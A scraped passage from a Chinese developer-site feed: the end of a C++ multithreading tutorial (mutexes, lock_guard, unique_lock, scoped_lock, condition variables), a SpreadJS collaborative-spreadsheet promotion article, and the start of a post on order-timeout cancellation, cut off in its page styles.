<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t1</span><span class="hljs-params">(increment_counter)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">t2</span><span class="hljs-params">(increment_counter)</span></span>;

    t1.<span class="hljs-built_in">join</span>();
    t2.<span class="hljs-built_in">join</span>();

    std::cout &lt;&lt; <span class="hljs-string">"最终计数器值："</span> &lt;&lt; shared_counter &lt;&lt; std::endl;  <span class="hljs-comment">// 预期输出2000</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>互斥锁虽然可以解决竞态条件问题,但需要需手动调用<code>lock()</code>和<code>unlock()</code>,若临界区代码抛出异常，会导致unlock()无法执行，进而引发死锁,而且多锁场景下，若加锁顺序不一致，极易出现死锁问题,操作难度太大,因而就有了让互斥锁更安全灵活的<code>锁管理工具</code></p>
<h2 data-id="heading-4">锁管理工具</h2>
<p>锁管理工具主要有三种:分别是<code>守卫锁</code>,<code>唯一锁</code>,<code>作用域锁</code></p>
<h3 data-id="heading-5">std::lock_guard（守卫锁）</h3>
<p><code>std::lock_guard</code>是最轻量化的<code>RAII 锁管理工具</code>,构造时自动调用<code>lock()</code>加锁，析构时自动调用<code>unlock()</code>解锁</p>
<p>适用于简单的临界区资源保护，无需手动控制加解锁时机,以下是代码示例:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx;
<span class="hljs-type">int</span> shared_num = <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_num</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 构造lock_guard时自动加锁</span>
    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
    shared_num++;
    std::cout &lt;&lt; <span class="hljs-string">"当前共享变量值："</span> &lt;&lt; shared_num &lt;&lt; std::endl;
    <span class="hljs-comment">// 函数结束，lock_guard析构自动解锁，即使中途抛异常也能正常解锁</span>
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t1</span><span class="hljs-params">(add_num)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">t2</span><span class="hljs-params">(add_num)</span></span>;
    t1.<span class="hljs-built_in">join</span>();
    t2.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-6">std::unique_lock（唯一锁）</h3>
<p><code>std::unique_lock</code>是最灵活的<code> RAII 锁管理工具</code>，支持手动加解锁、超时等待、延迟加锁等操作,并且可配合条件变量使用</p>
<p>适用于复杂的锁控制场景，需要灵活调整加解锁时机,代码示例如下:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx;
<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">task</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx, std::defer_lock)</span></span>; <span class="hljs-comment">// 延迟加锁，构造时不自动加锁</span>
    <span class="hljs-comment">// 手动加锁</span>
    lock.<span class="hljs-built_in">lock</span>();
    count += <span class="hljs-number">5</span>;
    std::cout &lt;&lt; <span class="hljs-string">"count更新为："</span> &lt;&lt; count &lt;&lt; std::endl;
    <span class="hljs-comment">// 手动解锁</span>
    lock.<span class="hljs-built_in">unlock</span>();
    
    <span class="hljs-comment">// 可再次加锁</span>
    lock.<span class="hljs-built_in">lock</span>();
    count += <span class="hljs-number">3</span>;
    std::cout &lt;&lt; <span class="hljs-string">"count最终值："</span> &lt;&lt; count &lt;&lt; std::endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t</span><span class="hljs-params">(task)</span></span>;
    t.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-7">std::scoped_lock（作用域锁）</h3>
<p><code>std::scoped_lock</code>是专为多锁场景设计的<code>RAII管理工具</code>，能自动对传入的多个互斥锁排序加锁，从根源杜绝多锁死锁问题</p>
<p>适用于需要同时获取多个互斥锁的场景,代码示例如下:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx1, mtx2;
<span class="hljs-type">int</span> data1 = <span class="hljs-number">0</span>, data2 = <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_data</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 自动对mtx1、mtx2排序加锁，避免死锁</span>
    <span class="hljs-function">std::scoped_lock <span class="hljs-title">lock</span><span class="hljs-params">(mtx1, mtx2)</span></span>;
    data1++;
    data2++;
    std::cout &lt;&lt; <span class="hljs-string">"data1="</span> &lt;&lt; data1 &lt;&lt; <span class="hljs-string">"，data2="</span> &lt;&lt; data2 &lt;&lt; std::endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t1</span><span class="hljs-params">(update_data)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">t2</span><span class="hljs-params">(update_data)</span></span>;
    t1.<span class="hljs-built_in">join</span>();
    t2.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-8">条件变量</h2>
<p><code>std::condition_variable</code>（条件变量）是 C++ 多线程中实现线程阻塞等待的核心工具，它允许线程阻塞至特定条件满足后再被唤醒，避免了 “忙等” 带来的 CPU 资源浪费</p>
<h3 data-id="heading-9">核心特性</h3>
<p><strong>阻塞等待</strong>：线程调用<code>wait()</code>后会释放持有的互斥锁，进入阻塞状态，直到被其他线程唤醒</p>
<p><strong>唤醒机制</strong>：通过<code>notify_one()</code>唤醒一个等待线程，或<code>notify_all()</code>唤醒所有等待线程</p>
<p><strong>绑定互斥锁</strong>：必须配合<code>std::unique_lock&lt;std::mutex&gt;</code>使用，无法直接搭配其他锁</p>
<p><strong>虚假唤醒</strong>：即使未被主动唤醒，等待线程也可能被唤醒，因此需在循环中检查条件是否真的满足</p>
<p>适用于生产者 - 消费者模型：队列满或者空时让对应线程等待,线程池,多线程同步等待某个事件触发和超时等待场景等场景,代码示例如下:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;condition_variable&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>

std::queue&lt;<span class="hljs-type">int</span>&gt; task_queue;
std::mutex mtx;
std::condition_variable cv;

<span class="hljs-comment">// 生产者：往队列中添加任务</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">producer</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++) {
        <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
        task_queue.<span class="hljs-built_in">push</span>(i);
        std::cout &lt;&lt; <span class="hljs-string">"生产者生产任务："</span> &lt;&lt; i &lt;&lt; std::endl;
        lock.<span class="hljs-built_in">unlock</span>();
        <span class="hljs-comment">// 唤醒一个消费者线程</span>
        cv.<span class="hljs-built_in">notify_one</span>();
        std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">500</span>));
    }
}

<span class="hljs-comment">// 消费者：从队列中取任务执行</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">consumer</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
        <span class="hljs-comment">// 循环检查条件，避免虚假唤醒</span>
        cv.<span class="hljs-built_in">wait</span>(lock, []{ <span class="hljs-keyword">return</span> !task_queue.<span class="hljs-built_in">empty</span>(); });
        
        <span class="hljs-type">int</span> task = task_queue.<span class="hljs-built_in">front</span>();
        task_queue.<span class="hljs-built_in">pop</span>();
        std::cout &lt;&lt; <span class="hljs-string">"消费者执行任务："</span> &lt;&lt; task &lt;&lt; std::endl;
        lock.<span class="hljs-built_in">unlock</span>();
        
        <span class="hljs-keyword">if</span> (task == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 任务执行完毕退出</span>
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">prod</span><span class="hljs-params">(producer)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">cons</span><span class="hljs-params">(consumer)</span></span>;
    
    prod.<span class="hljs-built_in">join</span>();
    cons.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-10">总结</h2>
<p><code>多线程</code>是通过在程序中创建多个线程,并且结合<code>互斥锁</code>以及<code>锁管理工具</code>和<code>条件变量</code>来实现CPU利用效率的提高,在短时间内跑完多个任务的技术,是我们每个C++程序员绕不开的技术</p>
<p>觉得文章对您有帮助的话可以点赞关注,我将会持续分享高质量的内容~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于SpreadJS的协同填报应用 | 葡萄城技术团队]]></title>    <link>https://juejin.cn/post/7581741663183323171</link>    <guid>https://juejin.cn/post/7581741663183323171</guid>    <pubDate>2025-12-10T01:54:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581741663183323171" data-draft-id="7581741663183306787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于SpreadJS的协同填报应用 | 葡萄城技术团队"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T01:54:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="葡萄城技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/3227821868332765"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于SpreadJS的协同填报应用 | 葡萄城技术团队
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821868332765/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    葡萄城技术团队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:54:26.000Z" title="Wed Dec 10 2025 01:54:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">基于SpreadJS的协同填报应用</h2>
<h3 data-id="heading-1">协同电子表格带来的效率革命</h3>
<p>在数字化转型的浪潮中，企业对高效协作和数据处理的需求日益增长。以 Microsoft 365、飞书多维表格等为代表的协同电子表格工具，凭借其实时编辑、多方共享的特性，极大地革新了传统基于本地Excel分享的工作模式。</p>
<p>协同电子表格的普及，显著提升了日常办公的效率，它成功解决了以下关键问题：</p>
<ul>
<li>文件版本混乱问题： 彻底告别“最终版-最终版-最终版-v2”的困境，保证所有参与者始终在同一个最新的文档上工作。</li>
<li>数据孤岛与传输延迟： 实现了数据的集中管理和实时同步，从而无需通过邮件或即时通讯工具反复发送文件，有效加快了业务流转速度。</li>
<li>基础协作门槛高： 提供了在线评论、权限管理等功能，让团队协作更加便捷和透明。</li>
</ul>
<h3 data-id="heading-2">传统协同电子表格在企业级填报场景的局限性</h3>
<p>尽管主流协同电子表格在通用协作方面表现出色，但在企业级数据填报这一核心场景中，其局限性也日益凸显：</p>
<ol>
<li><strong>数据安全与私有化挑战</strong>： 大多采用SaaS模式，难以满足金融、政府等行业对核心业务数据进行私有化部署和保证严格安全合规的要求。</li>
<li><strong>系统集成度低</strong>： 缺乏作为底层组件嵌入企业现有 ERP、OA 等业务系统的能力，导致数据在应用间形成“数据烟囱”。</li>
<li><strong>高昂的部署成本</strong>： 商业协同工具的私有化版本通常费用高昂，且定制化难度大，维护成本高。</li>
<li><strong>数据交互受限</strong>： 难以灵活地进行结构化数据的提取和回写，阻碍了表格数据与企业数据库之间的无缝连接。</li>
</ol>
<h3 data-id="heading-3">SpreadJS 协同插件：专为企业级协同填报设计的解决方案</h3>
<p>SpreadJS的协同能力并非简单的“黑盒”功能，而是采用了多层、解耦的中间件架构。这种架构设计赋予了企业极高的部署灵活性和定制化空间。</p>
<ul>
<li>灵活的私有化部署方式，可选择将协同服务和业务系统共同部署，也可部署独立的微服务，通过API为多个业务系统提供填报协作能力，并支持docker、负载均衡等技术。</li>
<li>多层次的定制化空间，从前端页面、冲突处理到用户鉴权，数据存储等各个环节，均可以通过中间件的方式二开处理，从而开发满足个性化需求的系统。</li>
</ul>
<p>例如SpreadJS协同文档服务不仅支持自定义数据库配置，同时可配置快照存取规则，同时也可以使用use中间件和on注册钩子自定义处理逻辑注册中间件和on注册钩子自定义处理逻辑，在自定义逻辑中记录额外日志或者添加业务相关操作。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59e473dda7dd401b91084630c203ecc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JGh6JCE5Z-O5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936465&amp;x-signature=X0ozP0KAWjcN2zXaShvJzKbNwiI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-4">基于“数据区域管理器”实现业务解耦</h3>
<p>在协同填报场景中，一个核心挑战是如何既支持业务数据的按权限展示填报，又可以实现文档的多人共享协同操作。SpreadJS的数据区域管理器（Data Range Provider）可以结合协同插件共同解决这个问题。</p>
<ul>
<li>独立的数据区域，SpreadJS可以在客户端创建客户独享的“数据区域”，结合业务、用户权限单独对区域进行配置，实现每个用户拥有个性化的表格。</li>
<li>业务数据和文档分离，通过数据区域指定业务数据，使这些业务数据可以通过数据区域与业务系统同步，而其他区域内容则有协同服务来处理</li>
<li>业务与协同解耦，大大简化了系统设计的复杂度，无需考虑如何从协同的文档中抽取业务数据。</li>
</ul>
<p>在填报数据区域内，每个客户端可独立控制数据区域内的数据存取校验、单元格样式以及编辑权限等电子表格特性，当校验通过或存储成功后，交由协同层同步。区域以外由协同层直接同步共享。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b65d5ebeb61341fca1d5d958ea44d2e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JGh6JCE5Z-O5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936465&amp;x-signature=mEwXh7nJns4EeV1T02Tfkvx9XOI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-5">总结：企业级协同填报新基座</h3>
<p>在数字化转型浪潮中，尽管传统协同电子表格提升了日常办公效率 ，但 SpreadJS 通过组件化特性、多层解耦的中间件架构，特别是独有的“数据区域管理器”，成功弥补了主流工具在企业级应用中的局限 。该方案支持灵活的私有化部署，满足金融、政府等行业对核心业务数据的严格安全合规要求 。同时，它允许作为底层组件嵌入企业现有系统，打破了系统集成度低的挑战 ，并实现了业务数据与文档内容的分离，有效解决业务与协同的解耦问题 。最终，SpreadJS 为企业提供了一个强大、灵活且安全的新基座，赋能企业级数据协作新模式 。</p>
<h3 data-id="heading-6">扩展链接</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.grapecity.com.cn%2Fblogs%2Fwhy-exactly-do-excel-files-get-corrupted-in-depth-ooxml-underlying-principles-and-practical-repair-strategies" target="_blank" title="https://www.grapecity.com.cn/blogs/why-exactly-do-excel-files-get-corrupted-in-depth-ooxml-underlying-principles-and-practical-repair-strategies" ref="nofollow noopener noreferrer">硬核干货 | Excel 文件到底是怎么坏掉的？深入 OOXML 底层原理讲解修复策略</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[订单超时取消机制中的重复取消问题]]></title>    <link>https://juejin.cn/post/7581727073580990515</link>    <guid>https://juejin.cn/post/7581727073580990515</guid>    <pubDate>2025-12-10T00:50:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073580990515" data-draft-id="7579920818871615530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="订单超时取消机制中的重复取消问题"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-10T00:50:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uup"/> <meta itemprop="url" content="https://juejin.cn/user/4378706456356627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            订单超时取消机制中的重复取消问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4378706456356627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:50:51.000Z" title="Wed Dec 10 2025 00:50:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body 